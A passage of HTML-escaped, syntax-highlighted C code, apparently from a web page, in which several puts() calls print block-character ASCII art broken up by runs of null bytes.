style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▓▓█▓▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▒▓▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▓███▓▓▒▒▒▒▒▒▒▓██▓█▓▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▓▓▒▒▒░▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▒▒▒▓▓█▓▒▓▒▒▒░░░░░▒▒▓▒▒▒▒▒▓▒▒▒▒▒▒▒▓░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓░░█▓▒▓▓▓▒░░░░▒▒▒▒▒▒▒▓▓▓▒▓▓▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒░░░▓▓▓█▓▓▒▒▒▒▒▒▒▒▒▒▒▓▓▓█▒░░▒▓▓▓▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓██████▓▓▒▒▒▒▒▒▓▓▓▓▓░ ░░▒░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▓█████▓▒▒▒▒▒▒▒▓▓▓▒░ ░ ░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓██████▓▒▒▓▓▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▒▓▒▓▓▓▓██▓█▓▓▒▒▒▒▒░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▒▓▓▓▓▓▓░▒▒▒▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░▓▓▓▓▓▓▓▒ ░▒▓▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▒▒▒▒▒░░░ ░▒▓▒▒▒▒▓▓░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░░░░░░░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░ &amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> puts(&lt;span style="color:#e6db74">&amp;#34; ░░▒▒▒▒▒▓▓▓▓▓▒▒▒▒▒▓▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ▒▒▒▓▓▓▓▓▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▓▒▓▓▓▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░▓▓▒▒▒▒▒▒▒▒▒▒▒░▒▒▒▒▒▒▒▒▓▒░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░▓▓▒▒▒▒▒▒▒▒▒▒▒░░▒▒▒▒▒▒▒▓▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░░░▓▒▒▒▒▒▒▒▒▒▒░▒▒░▒▓▒▒▒▒▒▒▒ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> ░ ░░▒▓▒▒▒▒▒▒▒▒▒░░▒░▒▒▓▒▒▒▒▒▒▒▒░░ ░ &lt;/span>&lt;span style="color:#ae81ff">\x00\x00\x00\x00&lt;/span>&lt;span style="color:#e6db74"> 